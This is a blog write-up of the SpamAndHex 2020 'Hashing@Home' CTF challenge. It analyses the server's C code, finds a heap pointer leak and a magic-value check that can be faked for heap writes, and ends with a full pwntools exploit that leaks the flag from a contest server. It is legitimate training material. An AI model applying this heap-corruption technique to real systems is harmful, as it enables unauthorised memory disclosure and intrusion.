<!doctype html><html class="dark light"><head><meta charset=UTF-8><meta content="IE=edge" http-equiv=X-UA-Compatible><meta content="width=device-width,initial-scale=1.0" name=viewport><title>
         SpamAndHex 2020 Hashing@Home Writeup
        
    </title><meta content="SpamAndHex 2020 Hashing@Home Writeup" property=og:title><link href=https://pwnverse.github.io/fonts.css rel=stylesheet><script>(function(){var a=document.createElement('script');a.setAttribute('src','/js/imamu.js');a.setAttribute('data-website-id','74344cd8-1e87-4c38-8acd-f96049b8f07e');a.setAttribute('data-host-url','https:&#x2F;&#x2F;analytics.eu.umami.is');document.body.appendChild(a)})()</script><script async data-host-url=https://analytics.eu.umami.is data-website-id=74344cd8-1e87-4c38-8acd-f96049b8f07e src=/js/imamu.js></script><script async data-goatcounter=https://Cyb0rG.goatcounter.com/count src=https://pwnverse.github.io/js/count.js></script><noscript><img src="https://Cyb0rG.goatcounter.com//count?p=/posts/hashing/&t=SpamAndHex 2020 Hashing@Home Writeup"></noscript><link title="Cyb0rG's Home" href=https://pwnverse.github.io/atom.xml rel=alternate type=application/atom+xml><link href=https://pwnverse.github.io/theme/light.css rel=stylesheet><link href=https://pwnverse.github.io/theme/dark.css id=darkModeStyle rel=stylesheet><link href=https://pwnverse.github.io/main.css media=screen rel=stylesheet><body><div class=content><header><div class=main><a href=https://pwnverse.github.io>Cyb0rG's Home</a><div class=socials><a class=social href=https://twitter.com/_Cyb0rG rel=me> <img alt=twitter src=/social_icons/twitter.svg> </a><a class=social href=https://github.com/PwnVerse/ rel=me> <img alt=github src=/social_icons/github.svg> </a></div></div><nav><a href=/posts style=margin-left:.7em>/posts</a><a href=/projects style=margin-left:.7em>/projects</a><a href=/about style=margin-left:.7em>/about</a> | <a href=javascript:void(0) id=dark-mode-toggle onclick=toggleTheme()> <img id=sun-icon src=/feather/sun.svg style=filter:invert(1)> <img id=moon-icon src=/feather/moon.svg> </a><script src=https://pwnverse.github.io/js/themetoggle.js></script></nav></header><main><article><div class=title><div class=page-header>SpamAndHex 2020 Hashing@Home Writeup<span class=primary-color style=font-size:1.6em>.</span></div><div class=meta>Posted on <time>2020-05-12</time></div></div><section class=body><p>We had a lot of fun solving this challenge and were so close to solving the challege but we couldnt get the pun that the description was trying to make. Anyways , jokes apart , following is the intended solution for this challenege.<h2 id=description>Description</h2><p>We have been provided with the source code running on the <strong>server</strong> side as well as the client side.<h2 id=source-code-analysis>Source Code Analysis</h2><p>Initially , let's compile the source with <code>gcc -o server server.c</code>.<p>The source code of the server binary is pretty straight forward.<p>The main function reads 3 arguments.<pre class=language-c data-lang=c style=background:#0f1419;color:#bfbab0><code class=language-c data-lang=c><span style=color:#ff7733>int </span><span style=color:#ffb454>main</span><span>(</span><span style=color:#ff7733>int </span><span style=color:#f29718>argc</span><span style=color:#bfbab0cc>, </span><span style=color:#ff7733>char</span><span style=color:#f29668>** </span><span style=color:#f29718>argv</span><span>){
</span><span>    </span><span style=color:#ff7733>if </span><span>(argc </span><span style=color:#f29668>!= </span><span style=color:#f29718>4</span><span>) {
</span><span>        </span><span style=color:#f07178>printf</span><span>(
</span><span>            </span><span style=color:#c2d94c>"Usage: hashing_at_home_server key_bytes records_file output_file</span><span style=color:#95e6cb>\n</span><span style=color:#c2d94c>"
</span><span>            </span><span style=color:#c2d94c>"</span><span style=color:#95e6cb>\n</span><span style=color:#c2d94c>"
</span><span>            </span><span style=color:#c2d94c>"This software reads a file in chunks, hashes these chunks many times</span><span style=color:#95e6cb>\n</span><span style=color:#c2d94c>"
</span><span>            </span><span style=color:#c2d94c>"and then combine the hashes and hash them again for extra secureness.</span><span style=color:#95e6cb>\n</span><span style=color:#c2d94c>"
</span><span>            </span><span style=color:#c2d94c>"Unfortunately, this is resource-intensive, so it uses a networked worker</span><span style=color:#95e6cb>\n</span><span style=color:#c2d94c>"
</span><span>            </span><span style=color:#c2d94c>"to do the hash rounds in parallel.</span><span style=color:#95e6cb>\n</span><span style=color:#c2d94c>"
</span><span>            </span><span style=color:#c2d94c>"</span><span style=color:#95e6cb>\n</span><span style=color:#c2d94c>"
</span><span>            </span><span style=color:#c2d94c>"(TEST VERSION USING STDIO. use xinetd or something to make it networked)</span><span style=color:#95e6cb>\n</span><span style=color:#c2d94c>"</span><span>)</span><span style=color:#bfbab0cc>;
</span><span>        </span><span style=color:#ff7733>return </span><span style=color:#f29718>1</span><span style=color:#bfbab0cc>;
</span><span>    }
</span><span>    key_bytes </span><span style=color:#f29668>= </span><span style=color:#f07178>calloc</span><span>(</span><span style=color:#f29718>1</span><span style=color:#bfbab0cc>, </span><span style=color:#f29718>64</span><span>)</span><span style=color:#bfbab0cc>;
</span><span>    </span><span style=color:#f07178>strncpy</span><span>(key_bytes</span><span style=color:#bfbab0cc>,</span><span> argv[</span><span style=color:#f29718>1</span><span>]</span><span style=color:#bfbab0cc>, </span><span style=color:#f29718>63</span><span>)</span><span style=color:#bfbab0cc>;
</span><span>    </span><span style=color:#ffb454>read_input</span><span>(argv[</span><span style=color:#f29718>2</span><span>])</span><span style=color:#bfbab0cc>;
</span><span>    </span><span style=color:#ffb454>do_the_work</span><span>()</span><span style=color:#bfbab0cc>;
</span><span>    </span><span style=color:#ffb454>write_output</span><span>(argv[</span><span style=color:#f29718>3</span><span>])</span><span style=color:#bfbab0cc>;
</span><span>    </span><span style=color:#ff7733>return </span><span style=color:#f29718>0</span><span style=color:#bfbab0cc>;
</span><span>}
</span></code></pre><ul><li>The first Argument is the string that is stored on the heap with a <em>calloc</em> call of 64 bytes.<li>The Second Argument is a <strong>char pointer</strong> to the <em>read_input</em> function.<li>The Third Argument is also a <em>char pointer</em> to the <em>write_output</em> function.</ul><p>There are constants defined.<pre class=language-c data-lang=c style=background:#0f1419;color:#bfbab0><code class=language-c data-lang=c><span style=color:#ff7733>#define </span><span style=color:#59c2ff>ROUNDS </span><span style=color:#f29718>100
</span><span style=color:#ff7733>#define </span><span style=color:#59c2ff>CHUNK_SIZE </span><span style=color:#f29718>32
</span><span style=color:#ff7733>#define </span><span style=color:#59c2ff>CONTEXT_MAGIC </span><span style=color:#f29718>0x6861736822686f6d</span><span style=color:#ff7733>ULL
</span><span>
</span></code></pre><p>The <em>read_input</em> function creates a structure for each allocated chunk.<pre class=language-c data-lang=c style=background:#0f1419;color:#bfbab0><code class=language-c data-lang=c><span style=color:#ff7733>void </span><span style=color:#ffb454>read_input</span><span>(</span><span style=color:#ff7733>char</span><span style=color:#f29668>* </span><span style=color:#f29718>filename</span><span>){
</span><span>    </span><span style=color:#ff7733>int</span><span> fd </span><span style=color:#f29668>= </span><span style=color:#ffb454>open</span><span>(filename</span><span style=color:#bfbab0cc>,</span><span> O_RDONLY)</span><span style=color:#bfbab0cc>;
</span><span>    </span><span style=color:#ff7733>char</span><span> record[CHUNK_SIZE]</span><span style=color:#bfbab0cc>;
</span><span>    hash_rpc_context </span><span style=color:#f29668>*</span><span> previous</span><span style=color:#f29668>=</span><span style=color:#f29718>NULL</span><span style=color:#bfbab0cc>;
</span><span>    </span><span style=color:#ff7733>while</span><span>(</span><span style=color:#ffb454>read</span><span>(fd</span><span style=color:#bfbab0cc>,</span><span>record</span><span style=color:#bfbab0cc>,</span><span>CHUNK_SIZE)</span><span style=color:#f29668>==</span><span>CHUNK_SIZE){
</span><span>        hash_rpc_context </span><span style=color:#f29668>*</span><span>context </span><span style=color:#f29668>= </span><span style=color:#f07178>calloc</span><span>(</span><span style=color:#f29718>1</span><span style=color:#bfbab0cc>, </span><span style=color:#ff7733>sizeof</span><span>(hash_rpc_context))</span><span style=color:#bfbab0cc>;
</span><span>        context</span><span style=color:#f29668>-></span><span>magic </span><span style=color:#f29668>=</span><span> CONTEXT_MAGIC</span><span style=color:#bfbab0cc>;
</span><span>        context</span><span style=color:#f29668>-></span><span>next </span><span style=color:#f29668>=</span><span> previous</span><span style=color:#bfbab0cc>;
</span><span>        context</span><span style=color:#f29668>-></span><span>rounds_left </span><span style=color:#f29668>=</span><span> ROUNDS</span><span style=color:#bfbab0cc>;
</span><span>        </span><span style=color:#ff7733>for </span><span>(</span><span style=color:#ff7733>unsigned</span><span> i</span><span style=color:#f29668>=</span><span style=color:#f29718>0</span><span style=color:#bfbab0cc>;</span><span> i</span><span style=color:#f29668><</span><span>CHUNK_SIZE</span><span style=color:#bfbab0cc>; </span><span style=color:#f29668>++</span><span>i)
</span><span>            context</span><span style=color:#f29668>-></span><span>data_to_hash[i] </span><span style=color:#f29668>=</span><span> record[i] </span><span style=color:#f29668>^</span><span> key_bytes[i]</span><span style=color:#bfbab0cc>;
</span><span>        previous </span><span style=color:#f29668>=</span><span> context</span><span style=color:#bfbab0cc>;
</span><span>    }
</span><span>    first_context </span><span style=color:#f29668>=</span><span> previous</span><span style=color:#bfbab0cc>;
</span><span>    </span><span style=color:#ffb454>close</span><span>(fd)</span><span style=color:#bfbab0cc>;
</span><span>}
</span></code></pre><p>Subsequently , the <em>read_input</em> opens the file with name that was passed as second argument to the binary and then callocs chunks of size 32 bytes until the entire data from the file is read and then xors the content of file with the initial argument that was passed into the binary which obviously is hidden from our site.<pre class=language-c data-lang=c style=background:#0f1419;color:#bfbab0><code class=language-c data-lang=c><span style=color:#ff7733>void </span><span style=color:#ffb454>do_the_work</span><span>(){
</span><span>    </span><span style=color:#ff7733>for </span><span>(hash_rpc_context</span><span style=color:#f29668>*</span><span> context </span><span style=color:#f29668>=</span><span> first_context</span><span style=color:#bfbab0cc>;</span><span> context</span><span style=color:#bfbab0cc>;</span><span> context </span><span style=color:#f29668>=</span><span> context</span><span style=color:#f29668>-></span><span>next){
</span><span>        </span><span style=color:#ffb454>send_request</span><span>(context)</span><span style=color:#bfbab0cc>;
</span><span>    }
</span><span>    </span><span style=color:#ff7733>while</span><span>(first_context</span><span style=color:#f29668>-></span><span>next) {
</span><span>        </span><span style=color:#ffb454>receive_response</span><span>()</span><span style=color:#bfbab0cc>;
</span><span>    }
</span><span>}
</span></code></pre><p>This function iterates over all chunks and calls the function <em>send_request</em>.<pre class=language-c data-lang=c style=background:#0f1419;color:#bfbab0><code class=language-c data-lang=c><span style=color:#ff7733>void </span><span style=color:#ffb454>send_request</span><span>(</span><span style=color:#ff7733>const</span><span> hash_rpc_context</span><span style=color:#f29668>* </span><span style=color:#f29718>request_context</span><span>){
</span><span>    </span><span style=font-style:italic;color:#5c6773>/* XXX: the request's pointer is used as the request ID
</span><span style=font-style:italic;color:#5c6773>     * maybe this should be an UUID? */
</span><span>    </span><span style=color:#ffb454>write</span><span>(</span><span style=color:#f29718>1</span><span style=color:#bfbab0cc>, </span><span style=color:#f29668>&</span><span>request_context</span><span style=color:#bfbab0cc>, </span><span style=color:#ff7733>sizeof</span><span>(request_context))</span><span style=color:#bfbab0cc>;
</span><span>    </span><span style=color:#ffb454>write</span><span>(</span><span style=color:#f29718>1</span><span style=color:#bfbab0cc>,</span><span> request_context</span><span style=color:#f29668>-></span><span>data_to_hash</span><span style=color:#bfbab0cc>,</span><span> CHUNK_SIZE)</span><span style=color:#bfbab0cc>;
</span><span>}
</span></code></pre><p>This function writes the content of all the user input chunks one by one by iterating through the linked list of all heap chunks except the very first one.<p>The first write prints <strong>heap address</strong> and hence we have Heap Leak with no efforts :P.<p>Thereafter , in the while loop of <em>do_the_work</em> function which executes till <em>first_context->next</em> is <strong>NULL</strong> and calls the function <em>recieve_response</em>.<h2 id=the-idea-of-exploitation>The Idea of Exploitation</h2><pre class=language-c data-lang=c style=background:#0f1419;color:#bfbab0><code class=language-c data-lang=c><span>
</span><span style=color:#ff7733>void </span><span style=color:#ffb454>receive_response</span><span>(){
</span><span>    hash_rpc_context</span><span style=color:#f29668>*</span><span> request_context</span><span style=color:#bfbab0cc>;
</span><span>    </span><span style=color:#ff7733>char</span><span> response_data[CHUNK_SIZE]</span><span style=color:#bfbab0cc>;
</span><span>    </span><span style=color:#ff7733>if </span><span>(</span><span style=color:#ffb454>read</span><span>(</span><span style=color:#f29718>0</span><span style=color:#bfbab0cc>, </span><span style=color:#f29668>&</span><span>request_context</span><span style=color:#bfbab0cc>, </span><span style=color:#ff7733>sizeof</span><span>(request_context)) </span><span style=color:#f29668>!= </span><span style=color:#ff7733>sizeof</span><span>(request_context)){
</span><span>        </span><span style=color:#f07178>exit</span><span>(</span><span style=color:#f29718>2</span><span>)</span><span style=color:#bfbab0cc>;
</span><span>    }
</span><span>    </span><span style=color:#ff7733>if </span><span>(</span><span style=color:#ffb454>read</span><span>(</span><span style=color:#f29718>0</span><span style=color:#bfbab0cc>,</span><span> response_data</span><span style=color:#bfbab0cc>,</span><span> CHUNK_SIZE) </span><span style=color:#f29668>!=</span><span> CHUNK_SIZE) {
</span><span>        </span><span style=color:#f07178>exit</span><span>(</span><span style=color:#f29718>3</span><span>)</span><span style=color:#bfbab0cc>;
</span><span>    }
</span><span>    </span><span style=color:#ff7733>if </span><span>(request_context</span><span style=color:#f29668>-></span><span>magic </span><span style=color:#f29668>!=</span><span> CONTEXT_MAGIC) {
</span><span>        </span><span style=color:#f07178>exit</span><span>(</span><span style=color:#f29718>4</span><span>)</span><span style=color:#bfbab0cc>;
</span><span>    }
</span><span>    </span><span style=color:#ffb454>process_response</span><span>(request_context</span><span style=color:#bfbab0cc>,</span><span> response_data)</span><span style=color:#bfbab0cc>;
</span><span>}
</span><span>
</span></code></pre><p>Here , we have arbitrary write , but how?? We have two reads being called <em>read(0, &request_context, sizeof(request_context))</em> and <em>read(0, response_data, CHUNK_SIZE)</em> both of which take user input from <strong>STDIN</strong> and then check whether the <code>*(request_context+8)==CONTEXT_MAGIC</code> and then calls the function <em>process_response</em>.<p>Initially we would not trigger the <em>process_response</em> function if we give some random input but dont't forget we have heap leaks all of which come from the structure that we saw earlier and hence passing a heap address we leaked could get us ahead into the <em>process_request</em> function.<p>Now comes the interesting part.<pre class=language-c data-lang=c style=background:#0f1419;color:#bfbab0><code class=language-c data-lang=c><span style=color:#ff7733>void </span><span style=color:#ffb454>process_response</span><span>(hash_rpc_context</span><span style=color:#f29668>* </span><span style=color:#f29718>request_context</span><span style=color:#bfbab0cc>, </span><span style=color:#ff7733>char </span><span style=color:#f29718>response_data</span><span>[CHUNK_SIZE]){
</span><span>    </span><span style=color:#f29668>--</span><span>request_context</span><span style=color:#f29668>-></span><span>rounds_left</span><span style=color:#bfbab0cc>;
</span><span>    </span><span style=color:#ff7733>if</span><span>(request_context</span><span style=color:#f29668>-></span><span>rounds_left){
</span><span>        </span><span style=color:#f07178>memcpy</span><span>(request_context</span><span style=color:#f29668>-></span><span>data_to_hash</span><span style=color:#bfbab0cc>,</span><span> response_data</span><span style=color:#bfbab0cc>,</span><span> CHUNK_SIZE)</span><span style=color:#bfbab0cc>;
</span><span>        </span><span style=color:#ffb454>send_request</span><span>(request_context)</span><span style=color:#bfbab0cc>;
</span><span>    } </span><span style=color:#ff7733>else </span><span>{
</span><span>        </span><span style=color:#ff7733>if </span><span>(
</span><span>            first_context</span><span style=color:#f29668>-></span><span>next </span><span style=color:#f29668>&&
</span><span>            first_context</span><span style=color:#f29668>-></span><span>rounds_left </span><span style=color:#f29668>== </span><span style=color:#f29718>0 </span><span style=color:#f29668>&&
</span><span>            first_context</span><span style=color:#f29668>-></span><span>next</span><span style=color:#f29668>-></span><span>rounds_left </span><span style=color:#f29668>== </span><span style=color:#f29718>0
</span><span>        ){
</span><span>            </span><span style=color:#ffb454>hash_together_the_first_two</span><span>()</span><span style=color:#bfbab0cc>;
</span><span>        }
</span><span>    }
</span><span>}
</span></code></pre><p>Awesome!! We have a memcpy here which copies <em>response_data</em> [We control] to <em>request_context->data_to_hash</em> [Also in our control]. e Hence , now we have almost arbitrary write on heap and stack also [But we dont have stack leak]. Ok , so the first idea that popped into my mind was , we could write on heap and fake its structure. What if we write the <em>CONTEXT_MAGIC</em> somewhere else on the heap , then we could take a pointer 8 bytes off the place we wrote <em>CONTEXT_MAGIC</em> to and easily trigger <strong>heap overflow</strong>.<p>By triggering the heap overflow , we can overwrite the structure of the next chunk. But what advantage does this give us??<ul><li>We dont have Free call anywhere.<li>We dont have any unlink anywhere.<li>All we have is we can read data from almost anywhere on heap.</ul><p>In response to all the information we had at the moment , I began searching for libc pointers on heap [if any] but found nothing to my disappointment :(.<p>This is where we were stuck during the CTF thinking of various possibilities of leaking libc and overwriting stack return address as we could trigger stack overflow also ,given we had a stack leak.<p>One interesting thing is that , we could craft the location of <em>CONTEXT_MAGIC</em> in such a way that , if we had a stack leak , we could easily bypass canary and get to the saved EIP.<p>Thereafter , we were totally puzzled as to how we should move forward with exploitation. The server side binary had <strong>jemalloc</strong> implemenated. This caught our attention. Considering this possibility that the further exploitation could be related to jemalloc, we started reading through internals of jemalloc without any luck.<h2 id=the-final-exploit>The final Exploit</h2><p>If we observe the <em>process_response</em> function there's an if condition which on returning true , calls a mysterious function , <em>hash_together_the_first_two</em>.<p>As we have heap overflow , we can satisfy the constraints of the if conditions and call that function.<pre class=language-c data-lang=c style=background:#0f1419;color:#bfbab0><code class=language-c data-lang=c><span style=color:#ff7733>void </span><span style=color:#ffb454>hash_together_the_first_two</span><span>(){
</span><span>    </span><span style=color:#ff7733>for </span><span>(</span><span style=color:#ff7733>unsigned</span><span> i</span><span style=color:#f29668>=</span><span style=color:#f29718>0</span><span style=color:#bfbab0cc>;</span><span> i</span><span style=color:#f29668><</span><span>CHUNK_SIZE</span><span style=color:#bfbab0cc>; </span><span style=color:#f29668>++</span><span>i){
</span><span>        first_context</span><span style=color:#f29668>-></span><span>next</span><span style=color:#f29668>-></span><span>data_to_hash[i] </span><span style=color:#f29668>^=</span><span> first_context</span><span style=color:#f29668>-></span><span>data_to_hash[i]</span><span style=color:#bfbab0cc>;
</span><span>    }
</span><span>    </span><span style=font-style:italic;color:#5c6773>/* TODO: free the first context. It crashes for some reason sometimes though */
</span><span>    first_context </span><span style=color:#f29668>=</span><span> first_context</span><span style=color:#f29668>-></span><span>next</span><span style=color:#bfbab0cc>;
</span><span>    first_context</span><span style=color:#f29668>-></span><span>rounds_left </span><span style=color:#f29668>=</span><span> ROUNDS</span><span style=color:#bfbab0cc>;
</span><span>    </span><span style=color:#ffb454>send_request</span><span>(first_context)</span><span style=color:#bfbab0cc>;
</span><span>}
</span><span>
</span></code></pre><p>This function xors the data of <code>current_chunk</code> with the data of the <code>current_chunk->next</code>. Then , it updates the <code>first_context</code> to <code>first_context->next</code>. Note that <code>first_context</code> is the chunk most recently allocated and we could overwrite its <code>fd</code> by overflowing from the chunk just above it.<p>If we overwrite the fd of the <code>first_context</code> chunk with the heap address of <code>key_bytes</code>[the very first allocated chunk on heap] , we can view it's contents.<p>On server , the contents of only the first argument are hidden so we try to leak them also. And eventually , it turns out that , the <code>key_bytes</code> were nothing but the flag.<p>Here is the complete exploit.<pre class=language-py data-lang=py style=background:#0f1419;color:#bfbab0><code class=language-py data-lang=py><span style=font-style:italic;color:#5c6773>#!/usr/bin/env python3
</span><span style=color:#ff7733>from </span><span>pwn </span><span style=color:#ff7733>import </span><span style=color:#f29718>*
</span><span> 
</span><span>r </span><span style=color:#f29668>= </span><span style=color:#ffb454>remote</span><span>(</span><span style=color:#c2d94c>'35.230.128.35'</span><span style=color:#bfbab0cc>, </span><span style=color:#f29718>1337</span><span>)
</span><span>magic </span><span style=color:#f29668>= </span><span style=color:#f29718>0x6861736822686f6d
</span><span> 
</span><span style=color:#ff7733>def </span><span style=color:#ffb454>read</span><span>():
</span><span>    ptr </span><span style=color:#f29668>= </span><span style=color:#ffb454>u64</span><span>(r</span><span style=color:#f29668>.</span><span style=color:#ffb454>recvn</span><span>(</span><span style=color:#f29718>8</span><span>))
</span><span>    data </span><span style=color:#f29668>= </span><span>r</span><span style=color:#f29668>.</span><span style=color:#ffb454>recvn</span><span>(</span><span style=color:#f29718>32</span><span>)
</span><span>    </span><span style=color:#f07178>print</span><span>(</span><span style=color:#ff7733>f</span><span style=color:#c2d94c>'</span><span>{ptr</span><span style=color:#f29718>:x</span><span>}</span><span style=color:#c2d94c>: </span><span>{data}</span><span style=color:#c2d94c>'</span><span>)
</span><span>    </span><span style=color:#ff7733>return </span><span>ptr
</span><span> 
</span><span style=color:#ff7733>def </span><span style=color:#ffb454>send</span><span>(</span><span style=color:#f29718>ptr</span><span style=color:#bfbab0cc>, </span><span style=color:#f29718>d0</span><span style=color:#bfbab0cc>, </span><span style=color:#f29718>d1</span><span style=color:#bfbab0cc>, </span><span style=color:#f29718>d2</span><span style=color:#bfbab0cc>, </span><span style=color:#f29718>d3</span><span>):
</span><span>    r</span><span style=color:#f29668>.</span><span style=color:#ffb454>send</span><span>(</span><span style=color:#ffb454>p64</span><span>(ptr))
</span><span>    r</span><span style=color:#f29668>.</span><span style=color:#ffb454>send</span><span>(</span><span style=color:#ffb454>p64</span><span>(d0) </span><span style=color:#f29668>+ </span><span style=color:#ffb454>p64</span><span>(d1) </span><span style=color:#f29668>+ </span><span style=color:#ffb454>p64</span><span>(d2) </span><span style=color:#f29668>+ </span><span style=color:#ffb454>p64</span><span>(d3))
</span><span> 
</span><span>reqs </span><span style=color:#f29668>= </span><span>[</span><span style=color:#ffb454>read</span><span>() </span><span style=color:#ff7733>for </span><span style=font-style:italic;color:#39bae6>_ </span><span style=color:#ff7733>in </span><span style=color:#f07178>range</span><span>(</span><span style=color:#f29718>16</span><span>)]
</span><span style=font-style:italic;color:#5c6773>#Print contents of entire heap eventually printing flag also
</span><span style=color:#ffb454>send</span><span>(reqs[</span><span style=color:#f29718>0</span><span>]</span><span style=color:#bfbab0cc>, </span><span style=color:#f29718>0</span><span style=color:#bfbab0cc>, </span><span style=color:#f29718>0</span><span style=color:#bfbab0cc>, </span><span style=color:#f29718>0</span><span style=color:#bfbab0cc>, </span><span style=color:#f29718>0</span><span>)
</span><span style=color:#ffb454>read</span><span>()
</span><span style=color:#ffb454>send</span><span>(reqs[</span><span style=color:#f29718>1</span><span>]</span><span style=color:#bfbab0cc>, </span><span style=color:#f29718>0</span><span style=color:#bfbab0cc>, </span><span style=color:#f29718>0</span><span style=color:#bfbab0cc>, </span><span style=color:#f29718>0</span><span style=color:#bfbab0cc>, </span><span>magic)
</span><span style=color:#ffb454>read</span><span>()
</span><span style=color:#ffb454>send</span><span>(reqs[</span><span style=color:#f29718>0</span><span>] </span><span style=color:#f29668>- </span><span style=color:#f29718>16</span><span style=color:#bfbab0cc>, </span><span style=color:#f29718>1</span><span style=color:#bfbab0cc>, </span><span>reqs[</span><span style=color:#f29718>15</span><span>] </span><span style=color:#f29668>- </span><span style=color:#f29718>64 </span><span style=color:#f29668>- </span><span style=color:#f29718>3</span><span style=color:#f29668>*</span><span style=color:#f29718>8</span><span style=color:#bfbab0cc>, </span><span style=color:#f29718>0</span><span style=color:#bfbab0cc>, </span><span style=color:#f29718>0</span><span>)
</span><span style=color:#ffb454>read</span><span>()
</span><span style=color:#ffb454>send</span><span>(reqs[</span><span style=color:#f29718>0</span><span>]</span><span style=color:#bfbab0cc>, </span><span style=color:#f29718>0</span><span style=color:#bfbab0cc>, </span><span style=color:#f29718>0</span><span style=color:#bfbab0cc>, </span><span style=color:#f29718>0</span><span style=color:#bfbab0cc>, </span><span style=color:#f29718>0</span><span>)
</span><span style=color:#ffb454>read</span><span>()
</span></code></pre></section></article></main></div>